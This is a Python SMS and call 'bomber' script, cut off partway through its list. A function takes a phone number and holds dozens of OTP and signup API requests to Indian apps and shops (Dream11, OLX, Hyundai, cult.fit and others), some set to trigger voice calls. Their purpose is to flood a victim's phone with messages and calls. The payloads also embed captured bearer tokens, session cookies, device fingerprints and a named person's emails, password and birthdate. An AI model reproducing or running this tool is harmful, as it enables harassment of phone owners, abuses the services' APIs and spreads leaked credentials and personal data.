import requests
import time
import json
def smsgiii(number):
    number = str(number)
    
    # List of APIs with their corresponding URLs, headers, and payloads
    apis = [
        {
            "method": "POST",
            "url": "https://user-onboarding-api-live.utec-build.com/userOnboardingService/generateOtp",
            "headers": {
                "Keep-Alive": "timeout=90, max=99",
                "Cache-Control": "no-cache",
                "Accept": "application/json",
                "App-Version": "V4",
                "Service-Session-Identifier": "256DF272EEBF45B9B06CC0D69D02907B_1716346615006",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "user-onboarding-api-live.utec-build.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Length": "39"
            },
            "data": {
                "appId": 1,
                "mobileNumber": number
            }
        },
        {
            "url": "https://prod.milkbasket.com/milkbasket_prod_current/consumer/user/register_mobile",
            "method": "POST",
            "data": {
                "retry": True,
                "mobile": number,
                "retryType": "voice",
                "loaderMessage": "Initializing call.."
            },
            "headers": {
                "Accept-Charset": "UTF-8",
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A105F Build/RP1A.200720.012)",
                "Host": "prod.milkbasket.com",
                "Connection": "Keep-Alive",
                "Content-Length": "94"
            }
        },
        {
            "method": "POST",
            "url": "https://v1.pro.rechargecube.in/auth/login/otp",
            "headers": {
                "Host": "v1.pro.rechargecube.in",
                "authorization": "",
                "content-type": "application/json",
                "content-length": "23",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {
                "mobile": number
            }
        },
        {
            "method": "POST",
            "url": "https://www.dream11.com/auth/passwordless/init",
            "headers": {
                "Host": "www.dream11.com",
                "content-type": "application/json; charset=utf-8",
                "content-length": "85",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1"
            },
            "data": {
                "phoneNumber": number,
                "templateName": "default",
                "channel": "sms",
                "flow": "SIGNIN"
            }
        },
        {
            "method": "POST",
            "url": "https://production.apna.co/api/userprofile/v1/otp/",
            "headers": {
                "Host": "production.apna.co",
                "content-type": "application/json; charset=utf-8",
                "content-length": "88",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1"
            },
            "data": {
                "retries": 0.0,
                "phone_number": f"91{number}",
                "source": "employer",
                "hash_type": "employer"
            }
        },
        {
            "method": "POST",
            "url": "https://prod.hirect.ai/hirect/login/otp",
            "headers": {
                "Host": "prod.hirect.ai",
                "x-timestamp": "1714759344812",
                "x-appversion": "3.5.5",
                "x-os": "android",
                "x-osversion": "14",
                "x-bundleid": "in.hirect",
                "x-deviceid": "c7abc1fd7459e84c",
                "x-model": "SM-F7110",
                "x-brand": "samsung",
                "x-widthpixels": "1260",
                "x-heightpixels": "2624",
                "x-dpi": "480",
                "x-appversioncode": "248",
                "x-api": "34",
                "x-mac": "12:34:56:61:23:6b",
                "x-language": "en",
                "x-fcmtoken": "cMnhKeWTSY-g3j7-E0jLWj:APA91bFV4oKivSAG3YhXZuT06fcP3G-0hSrfmGVfxYtqLS6Uae42OfETSk02f9sfotwxEhdrhhW2W9Ii0RMwG8zFIL8mJVgSj-3zaWYUl9Oa1x3VFHHf21eiO3aB133gVQ2W95O_9MyR",
                "x-region": "in",
                "x-role": "2",
                "x-androidid": "dDgo6im6ex6lHKrb6jwfgzqyNeX17l7aBZ7yYMk7pNQ=",
                "x-channel": "web",
                "x-networktype": "0",
                "x-timezone": "Asia/Calcutta",
                "content-type": "application/json; charset=UTF-8",
                "content-length": "35",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.8.0"
            },
            "data": {
                "mobile": f"+91{number}",
                "type": 1
            }
        },
        {
            "method": "POST",
            "url": "https://clicktobuy.hyundai.co.in/ctb/bank/generateOtpForAuthentication.ctb",
            "headers": {
                "Content-Type": "application/json; charset=utf-8",
                "Content-Length": "24",
                "Host": "clicktobuy.hyundai.co.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.9.1"
            },
            "data": {
                "cstmMob": number
            }
        },
        {
            "method": "POST",
            "url": "https://www.rummycircle.com/api/fl/account/v1/sendOtp",
            "headers": {
                "Host": "www.rummycircle.com",
                "content-type": "application/json; charset=utf-8",
                "content-length": "88",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1"
            },
            "data": {
                "otpOnCall": True,
                "mobile": number,
                "otpType": 8.0,
                "transactionId": 1.708139023656E12
            }
        },
        {
            "method": "POST",
            "url": "https://shop.havells.com/graphql",
            "headers": {
                "Host": "shop.havells.com",
                "content-type": "application/json; charset=utf-8",
                "content-length": "191",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1"
            },
            "data": {
                "variables": {
                    "mobile": number
                },
                "query": """mutation sendOtp($mobile: String!) {
  sendOtp(mobile: $mobile) {
    mobile
    message
    __typename
  }
}""",
                "operationName": "sendOtp"
            }
        },
        {
            "method": "POST",
            "url": "https://micro.banksathi.com/api/v1/auth_user/initinate_otp",
            "headers": {
                "Host": "micro.banksathi.com",
                "content-type": "application/json; charset=utf-8",
                "content-length": "92",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1"
            },
            "data": {
                "device_id": "",
                "whatsaap_consent": False,
                "mobile_no": number,
                "condition_accepted": True
            }
        },
        {
            "method": "POST",
            "url": "https://gateway.credmudra.com/public/send-otp",
            "data": {
                "data": {
                    "contactNo": number,
                    "resend": False,
                    "anonymousId": "65d48590cbf0720f6eec2505"
                }
            },
            "headers": {
                "Host": "gateway.credmudra.com",
                "Content-Type": "application/json; charset=utf-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.9.1"
            }
        },
        {
            "method": "POST",
            "url": "https://api.prod.oziva.in/nitro/send/",
            "data": {
                "phone": number,
                "source": "order_management",
                "type": "sms"
            },
            "headers": {
                "Host": "api.prod.oziva.in",
                "Content-Type": "application/json; charset=utf-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.9.1"
            }
        },
        {
            "method": "POST",
            "url": "https://prod.hirect.ai/hirect/login/otp",
            "data": {
                "mobile": number,
                "type": 3
            },
            "headers": {
                "Host": "prod.hirect.ai",
                "x-timestamp": "1714835211967",
                "x-appversion": "3.5.5",
                "x-os": "android",
                "x-osversion": "14",
                "x-bundleid": "in.hirect",
                "x-deviceid": "c7abc1fd7459e84c",
                "x-model": "SM-F7110",
                "x-brand": "samsung",
                "x-widthpixels": "1260",
                "x-heightpixels": "2624",
                "x-dpi": "480",
                "x-appversioncode": "248",
                "x-api": "34",
                "x-mac": "12:34:56:61:23:6b",
                "x-language": "en_US",
                "x-fcmtoken": "cMnhKeWTSY-g3j7-E0jLWj:APA91bFV4oKivSAG3YhXZuT06fcP3G-0hSrfmGVfxYtqLS6Uae42OfETSk02f9sfotwxEhdrhhW2W9Ii0RMwG8zFIL8mJVgSj-3zaWYUl9Oa1x3VFHHf21eiO3aB133gVQ2W95O_9MyR",
                "x-region": "in",
                "x-role": "2",
                "x-androidid": "dDgo6im6ex6lHKrb6jwfgzqyNeX17l7aBZ7yYMk7pNQ=",
                "x-channel": "web",
                "x-networktype": "0",
                "x-timezone": "Asia/Calcutta",
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.8.0"
            }
        },
        {
            "method": "POST",
            "url": "https://www.vidyakul.com/api/v1/login",
            "data": {
                "phone_number": number,
                "version_number": "6.0.5.9",
                "fcm_token": "fWSFkvMaQoi_btSsaHlMd2:APA91bE_AXYYAutauBN_fegTv7CiMWw0z2zylXgyq9792ra7ou4VfTJ3nI4gPFpla1AEIN_rtmgwqk9rL5DoldqjcmKdJeGIGDI6_p-rhE9xVLqCjVFaTE9tanuuccEhsuUTHhGkNVzl"
            },
            "headers": {
                "Host": "www.vidyakul.com",
                "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOjIyMDUxOSwiaXNzIjoiaHR0cDovL3d3dy52aWR5YWt1bC5jb20vYXBpL3YxL2xvZ2luIiwiaWF0IjoxNzE0NzQ0OTIxLCJleHAiOjE3MTczMzY5MjEsIm5iZiI6MTcxNDc0NDkyMSwianRpIjoiNEJsbFZZSFdpRnhPc1poRyJ9.xQSAIQdB4YeEgtbOa61WQj4MhzXxge5Cea3jzPEfRbc",
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.9.3"
            }
        },
        {
            "method": "POST",
            "url": "https://payben.in/user_apis/api.php",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "payben.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Length": "68"
            },
            "data": {
                "number": number,
                "type": "sendOTP",
                "key": "296cace78970b1fafafbc596f04b204c"
            }
        },
        {
            "method": "GET",
            "url": "https://potlamapp.com/prod/apis/sendOTPApi.php",
            "headers": {
                "Host": "potlamapp.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.9.1"
            },
            "params": {
                "mobileNumber": number,
                "otptype": "login",
                "role_id": "9",
                "platform": "ANDROID",
                "deviceId": "c7abc1fd7459e84c",
                "deviceName": "Samsung SM-F7110",
                "versionCode": "109",
                "appVersion": "5.1.1",
                "user_id": ""
            }
        },
        
        {
            "url": "https://prod.milkbasket.com/milkbasket_prod_current/consumer/user/register_mobile",
            "method": "POST",
            "data": {
                "mobile": number,
                "appHash": "tG3K6W/hoYi"
            },
            "headers": {
                "Accept-Charset": "UTF-8",
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A105F Build/RP1A.200720.012)",
                "Host": "prod.milkbasket.com",
                "Connection": "Keep-Alive",
                "Content-Length": "48"
            }
        },
        {
            "url": f"https://www.healthkart.com/veronica/user/validate/voice/1/{number}/signup?plt=2&st=1",
            "method": "GET",
            "headers": {
                "sec-ch-ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Brave\";v=\"114\"",
                "sec-ch-ua-mobile": "?1",
                "user-agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
                "st": "1",
                "plt": "2",
                "accept": "application/json, text/plain, */*",
                "device": "ba2a15558802b00",
                "pincode": "false",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-gpc": "1",
                "accept-language": "en-US,en;q=0.7",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.healthkart.com/",
                "accept-encoding": "gzip, deflate, br",
                "cookie": "adb=0; ufi=1; cf_clearance=6NwtHmrzLrHfHDe9UZgqjBzTw20eDLZJIRV6A0YTb88-1695612025-0-1-c3ce1f1.d62b60e6.5b3dbe11-0.2.1695612025"
            }
        },
        {
            "url": "https://unakotimart.com/public/api/generate-otp-for-login",
            "method": "POST",
            "headers": {
                "Host": "unakotimart.com",
                "content-length": "61",
                "sec-ch-ua": '"Android WebView";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json;charset=UTF-8",
                "sec-ch-ua-mobile": "?1",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; V2250 Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.42 Mobile Safari/537.36",
                "sec-ch-ua-platform": "Android",
                "origin": "https://unakotimart.com",
                "x-requested-with": "pure.lite.browser",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://unakotimart.com/login",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "cookie": "_ga=GA1.2.883798140.1712546446; _gid=GA1.2.1908890046.1712546471; _gat=1; _ga_R2VH04Z60R=GS1.1.1712546446.1.1.1712546488.0.0.0"
            },
            "data": {
                "phone": f"+91{number}",
                "email": "shivamyou662@gmail.com"
            }
        },
        {
            "url": "https://v2-api.bankopen.co/users/register/otp",
            "method": "POST",
            "headers": {
                "Host": "v2-api.bankopen.co",
                "content-length": "45",
                "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Android WebView";v="122"',
                "x-api-version": "3.1",
                "sec-ch-ua-mobile": "?1",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; V2250 Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.106 Mobile Safari/537.36",
                "content-type": "application/json",
                "accept": "application/json, text/plain, */*",
                "x-client-type": "Web",
                "baggage": "sentry-environment=prod,sentry-release=app-open-money%405.2.0,sentry-public_key=76093829eb3048de9926891ff8e44fac,sentry-trace_id=08b4ebc206c84d3cbe6e8f38565ed92f",
                "sentry-trace": "08b4ebc206c84d3cbe6e8f38565ed92f-b5d07f68050b9a91-1",
                "sec-ch-ua-platform": "Android",
                "origin": "https://app.opencapital.co.in",
                "x-requested-with": "pure.lite.browser",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://app.opencapital.co.in/en/onboarding/login?utm_source=google&utm_medium=cpc&utm_campaign=IYD_Businessloans&utm_term=best%20loan%20app&gad_source=1&gclid=EAIaIQobChMIrP-6nKeIhQMVLBKDAx3JcwcPEAMYASAAEgKThPD_BwE",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9"
            },
            "data": {
                "username": number,
                "is_open_capital": 1
            }
        },
        {
    "url": "https://apis.monginis.net/api/register",
    "method": "POST",
    "headers": {
        "Host": "apis.monginis.net",
        "Connection": "keep-alive",
        "Content-Length": "126",
        "sec-ch-ua": "\"Android WebView\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2250 Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.120 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "Origin": "https://cakesonline.monginis.net",
        "X-Requested-With": "pure.lite.browser",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://cakesonline.monginis.net/",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": "_gcl_au=1.1.1722287105.1714412869; _gid=GA1.2.1245384354.1714412869; _ga_ZYCBGPY2VS=GS1.1.1714412869.1.0.1714412869.60.0.0; _fbp=fb.1.1714412871917.1912131249; _hjSession_2781155=eyJpZCI6ImQxYzY4ZWQxLWI1NjUtNDBmNS05MDEyLTU4NTg4NTJhNWE4MCIsImMiOjE3MTQ0MTI4Nzg1MDgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=; monginis_session=bbzi0TCYqvXtZueNbZl0qAe0zueWjb3kTerHnxvj; _ga=GA1.2.2038256619.1714412869; _hjSessionUser_2781155=eyJpZCI6IjM5YjNhOWE2LTkwZTMtNTI1Mi1iMjA0LTk0MjIxNGViN2JjNCIsImNyZWF0ZWQiOjE3MTQ0MTI4Nzg1MDIsImV4aXN0aW5nIjp0cnVlfQ==; _ga_5HS0WWXH8T=GS1.1.1714412877.1.1.1714412908.29.0.806772904"
    },
    "data": {
        "first_name": "shivam",
        "last_name": "rajput",
        "mobile_number": number,
        "email": "shivamyo6200@gmail.com",
        "dob": "2003-04-29"
    }
},
{
    "url": "https://mrbrownbakery.com/public/api/reactotp",
    "method": "POST",
    "headers": {
        "Host": "mrbrownbakery.com",
        "Connection": "keep-alive",
        "Content-Length": "23",
        "sec-ch-ua": "\"Android WebView\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "Authorization": "Bearer",
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2250 Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.120 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "Origin": "https://m.mrbrownbakery.com",
        "X-Requested-With": "pure.lite.browser",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://m.mrbrownbakery.com/",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9"
    },
    "data": {
        "mobile": number
    }
},

        {
            "url": "https://api.olx.in/v2/auth/authenticate",
            "method": "POST",
            "data": {
                "grantType": "retry",
                "method": "call",
                "phone": "+91" + number
            },
            "headers": {
                "X-acf-sensor-data": "2,a,TMpKRTdoxJtA/bMtiQzskHx92U6siCaYWjBkNZaMsStuWWZ8O8m6MzoKfX2vfY1xHLr/yo3Gqb3Vyw7O39A0je0OuB/iUnEP/aai7Yu2g6XMOz8xlVpX8eB9l+dURtyhEypM+M/xqVEAXdyalyPrduvFtnx0TCyuwW6tau2maDo=,BHMkuAHLVGza6cgDuEpwN3QKPTKW0J+/J2TLj3blpjuyO2/GWlcYTZ44H7+LkSFzHOcUQibNhCZtqbTXTyo+4d6273WfIbB3vkcukA+1ZwN5WPbPJdx6FLRlhNclsMNT9lBjM6POZNnL67jknhAXDyoW+S9g/G6X0G/S4b5fWt4=\$c1f0jtr7Zs8nbUt4eHfw69RdeiqQJ+NdjDegCxj44oKDW/ki2UnT8vXzSLfAA+0HCYmhE1ESUyb8yywzdvmiXKhD82hIydxgQpVLtK9ctAHV5ASNLotwuqhi0gfPEZAgzeB9J+0XMhZ2mk+3A3jVaPdU0ya9eOlNXqy+V7zq0x1p6keahAFF2wgyqpq2775oq+OsP6OojhZI22tm0ZcsD7ElJ60GvKf1hDxtxxv8xugjeNG7CazWqHDpTL7Fb5BA/emn/lalI+JvhMaRc65RGNvfolQ2nVugn5dtJkG/BkwSayn/1Gtke4lHr9CqqOnb5gNhXDZ96hIGJtw8B+0HznBNetWq06xuAFSnjzd+vx/wc53NrHRPikfWhNeeJumE2U9WFuWZOHdb4hBvxQuOxDUNhiIP79n1qfVfszDhZ5Ezn7WFIO7Pl5KD6OHvDfCUzZeJ/g4vGUdrjDvq247LANeV/CqsqSVASZzP26BnANtgFF6kQAgATvvXwCcBYDpEIOeM0s27vMiDOemQiDqOpMYmdhAEjL2Vbvy6w3WY5X0roTcOFiXBqn8VsVEHiHHDEszzDxbNV2ueDV5Du7nRfTLt9ZF9LzJzy0sd9639DgmYm4r2CyYw9rIrQZHZhZ5G/DJml9r8XghR2ZulvClJfwhf1T/Xe8fNozCN9+Bm2+jOpWDfR9HZafMiWyuEGtyaekFRA2bgRVt25Q5vtRMgwQqoAmXHJ/YY8SWLFLY2NfFBkVCAjEuW5+Z6lISBL4KgyIrcz9FA/K4hzWz7sChPr2Wz6cwe6f6y50RanzhQRVn7Sac5MnJ0EbqArp+GqzleKCg1kZfNtVnB0HQqTLs29P+hA2DHct3KxFl0kEtL91w+81Y06s759oFINDics0ik1YL5Ghm0M+sdzmuvd7BVTm16Dpwg27/Dnf+BCs7+zGz2DXD4q3mNZ0U+neXYgGinKIRiUkf6ATs/RKsz41TVvQE1lTiZ4L9Sdqqyuu05/YRZrXNlx/uOkWEemsiM2B6Xq/OZC27b1aLbz4q4QIKzpjzN7fY9brMalcu5MVzm4GU=",
                "X-Panamera-fingerprint": "807da1a35e55235e",
                "User-Agent": "android 17.08.011 olxin",
                "x-origin-panamera": "Production",
                "laquesis": "pan-41767@b#pan-48465@b#pan-52057@b#pan-53615@b#pan-55363@b#pan-55982@b#pan-59448@b#pan-62267@a#pan-68253@a#road-43386@b#road-47263@a#road-74127@b",
                "laquesisff": "rate_us#resend_code_call_me#listers_verification#legion_login#show_advertisement#default_near_me#notification_pref#edit_location#legion_migrate_v2#pan-27935#pan-36788#pan-38000#pan-42665#pan-43831#pan-41327#pan-42666#pan-45244#pan-48529#pan-48912#pan-50288#pan-50705#pan-57022#road-123",
                "Content-Type": "application/json; charset=UTF-8",
           #     "Content-Length": str(len(json.dumps(data))),
                "Host": "api.olx.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
        },
{
        "url": "https://api.thesouledstore.com/api/v2/register-otp?platform=web",
        "method": "POST",
        "data": {
            "firstname": "Shivam",
            "lastname": "Rajput",
            "email": "shivamrajput6627@gmail.com",
            "password": "alagauwu@27",
            "telephone": number,
            "birthdate": "",
            "gender": "M",
            "token": ""
        }
    },
    {
        "url": "https://api.thesouledstore.com/api/v2/resend-otp-register?platform=web",
        "method": "POST",
        "data": {"telephone": number}
    },
    {
        "url": "https://session-service.aakash.ac.in/prod/sess/api/v1/user/phone/otp/",
        "method": "POST",
        "data": {
            "action": "generate",
            "phone": number,
            "access": "signup"
        }
    },
    {
        "url": "https://webapi.byjusexamprep.com/user/verify/sendOtp",
        "method": "POST",
        "data": {
            "deviceType": "web",
            "viaWhatsapp": False,
            "tel": "+91"+number
        }
    },
    {
        "url": "https://api.playo.io/onboard/generateOTP",
        "method": "POST",
        "data": {"countryCode": "+91", "mobile": number}
    },
    {
            "url": "https://www.cult.fit/api/auth/loginPhoneSendOtp",
            "method": "POST",
            "data": {
                "branchAnalyticsData": {},
                "phone": number,
                "medium": "call",
                "countryCallingCode": "+91",
                "deviceInfo": {
                    "appId": "fit.cure.android",
                    "bundleId": "fit.cure.android",
                    "brand": "Xiaomi",
                    "model": "Redmi Note 7 Pro",
                    "osName": "Android",
                    "osVersion": "13",
                    "deviceId": "aba34bc1f2672cc6",
                    "encryptedDeviceId": "G%2FafzOE%2FQ%2FuzAKDrR9dLNJLt9SRIQi2BbRM3xvPcj9x2lJce1hNXw%2FBvOmZkP6dSH%2FF3EhKdjG34%0APgQSXu%2F%2FrLSyQU9ApUUmA4AsFfMgDhW5kMS72pCcfZG0gIhSjVgzuzLvPtvaORg1WZ7Ovy7e62so%0AC0fhl2qOkJRZTy2rGhMifXEDEXqgQCYAdc5jmV5vLDyzKj%2FlivhP0OCSR2OA3ANhuqe8kKwirzTI%0AFQe0u%2BjIjuU%2BW4WdqepcweBhOcgYULl%2FjTif%2BxA1AhQygiSx%2BATQLw7jPdbMHLEwrpA5%2FoRWq5wS%0A7go%2BCKcvihR2wtMTqMqEOWyTRbm7A%2F%2Bvr%2F9nLvmAb1sINo%2FoM7sKCGP5%2FaDetHqB73%2BqUOEPoa1K%0AstP7MExClWQrUpDIkUDPBxI%2FB7tMw1s4VPjhHQBsPkC9fwWMDes6DbhvTqxc6IFi5e1VQ2ya1Kbf%0ADVG0rvfU7%2BUF87%2BTUVbB%2B12uDvrSRSYg31t3T7S6%2FiM2xT9MOsoJIvAfz5SUxDLDeo7mvg0JbQcj%0AeDyXqGjv0Kmat4lZ4eF3p3uHNfvTAYN5E5oFqHQ0T%2F2zj6nPFocp3%2BqHlvnfI6NULvup%2FrkQZSoc%0Ajg8BF6iwuUnsI44D%2FEl7MibWzNdySgObQ4zoRvt1rXjlWhes1HdsB4hJHer96j9wFpHEQ5ACa7Y%3D%0A",
                    "localeCountryCode": "US",
                    "size": {"height": 822, "width": 393},
                    "colorScheme": "dark"
                }
            },
            "headers": {
                "Host": "www.cult.fit",
                "accept": "application/json",
                "clientversion": "10.21",
                "osname": "android",
                "accept-encoding": "gzip",
                "timezone": "Asia/Kolkata",
                "codepushversion": "undefined",
                "deviceid": "aba34bc1f2672cc6",
                "encrypteddeviceid": "G%2FafzOE%2FQ%2FuzAKDrR9dLNJLt9SRIQi2BbRM3xvPcj9x2lJce1hNXw%2FBvOmZkP6dSH%2FF3EhKdjG34%0APgQSXu%2F%2FrLSyQU9ApUUmA4AsFfMgDhW5kMS72pCcfZG0gIhSjVgzuzLvPtvaORg1WZ7Ovy7e62so%0AC0fhl2qOkJRZTy2rGhMifXEDEXqgQCYAdc5jmV5vLDyzKj%2FlivhP0OCSR2OA3ANhuqe8kKwirzTI%0AFQe0u%2BjIjuU%2BW4WdqepcweBhOcgYULl%2FjTif%2BxA1AhQygiSx%2BATQLw7jPdbMHLEwrpA5%2FoRWq5wS%0A7go%2BCKcvihR2wtMTqMqEOWyTRbm7A%2F%2Bvr%2F9nLvmAb1sINo%2FoM7sKCGP5%2FaDetHqB73%2BqUOEPoa1K%0AstP7MExClWQrUpDIkUDPBxI%2FB7tMw1s4VPjhHQBsPkC9fwWMDes6DbhvTqxc6IFi5e1VQ2ya1Kbf%0ADVG0rvfU7%2BUF87%2BTUVbB%2B12uDvrSRSYg31t3T7S6%2FiM2xT9MOsoJIvAfz5SUxDLDeo7mvg0JbQcj%0AeDyXqGjv0Kmat4lZ4eF3p3uHNfvTAYN5E5oFqHQ0T%2F2zj6nPFocp3%2BqHlvnfI6NULvup%2FrkQZSoc%0Ajg8BF6iwuUnsI44D%2FEl7MibWzNdySgObQ4zoRvt1rXjlWhes1HdsB4hJHer96j9wFpHEQ5ACa7Y%3D%0A",
                "devicebrand": "Xiaomi",
                "devicemodel": "Redmi Note 7 Pro",
                "x-request-id": "18e6f566-9311-d97a-77f2-c987db0a71c7",
                "x-tenant-id": "curefit",
                "advertiserid": "a4c4e462-2744-4c94-85ea-db8b47f75d00",
                "content-type": "application/json",
             #   "content-length": str(len(json.dumps(data))),
                "user-agent": "okhttp/4.9.1"
            }
        },
    
    
    {
        "url": "https://www.cuemath.com/api/v4/login/",
        "method": "POST",
        "data": {
            "country_code": "91",
            "phone": number,
            "action": "get_otp",
            "flow": "login"
        }
    },
    {
            "url": "https://api.cureskin.com/api/parse/functions/requestOTP",
            "method": "POST",
            "data": {
                "mobileNumber": number,
                "deviceId": "f338792bf49fb2e48229",
                "source": "web",
                "time": "2023-09-24T08:22:25.811Z",
                "digest": "d7ec0ba46dc9eff36f048bb46592294c858070ad31fa770f4e1e1dea82cf6a93",
                "_ApplicationId": "myAppId",
                "_ClientVersion": "js3.4.4",
                "_InstallationId": "4d53e2d5-2108-42ed-92da-ac252e7f87ce"
            },
            "headers": {
                "Host": "api.cureskin.com",
                "Content-Length": "299",
                "Baggage": "sentry-environment=production,sentry-release=app%402.0.428-0,sentry-public_key=fb75233753ac48cc93a56596bcdc8525,sentry-trace_id=1f108bfb18da4ae99681d51a0c08419c",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36",
                "Sentry-Trace": "1f108bfb18da4ae99681d51a0c08419c-a22bb520894a1948-0",
                "Content-Type": "text/plain",
                "Accept": "*/*",
                "Origin": "https://app.cureskin.com",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://app.cureskin.com/",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8"
            }
        },
        {
            "url": "https://api.cureskin.com/api/parse/functions/retryOTP",
            "method": "POST",
            "data": {
                "mobileNumber": number,
                "deviceId": "f338792bf49fb2e48229",
                "time": "2023-09-24T08:22:57.160Z",
                "digest": "ab994830a6bca8ad49be89e14592d06deee04c42d63d6f4a6263b1b244e2d2f7",
                "_ApplicationId": "myAppId",
                "_ClientVersion": "js3.4.4",
                "_InstallationId": "4d53e2d5-2108-42ed-92da-ac252e7f87ce"
            },
            "headers": {
                "Host": "api.cureskin.com",
                "Content-Length": "284",
                "Baggage": "sentry-environment=production,sentry-release=app%402.0.428-0,sentry-public_key=fb75233753ac48cc93a56596bcdc8525,sentry-trace_id=46eaa3e5f35a480abd0a25517080c82f",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36",
                "Sentry-Trace": "46eaa3e5f35a480abd0a25517080c82f-aeaeed3f7740c180-0",
                "Content-Type": "text/plain",
                "Accept": "*/*",
                "Origin": "https://app.cureskin.com",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://app.cureskin.com/",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8"
            }
        },
        {
            "url": "https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call",
            "method": "POST",
            "data": {
                "contactNumber": number,
                "domainId": "2"
            },
            "headers": {
                "Content-Type": "application/json"
            }
        },
        
    {
        "url": "https://www.roposo.com/v3/auth/checkphonenumber",
        "method": "POST",
        "data": {"mode": 5.0, "phonenumber": "+91"+number}
    },
    
    {
        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        "method": "POST",
        "data": {"buildVersion": "24.0", "phone": number, "source": "signup", "type": "p", "device": "mobile", "email": ""}
    },
    {
        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
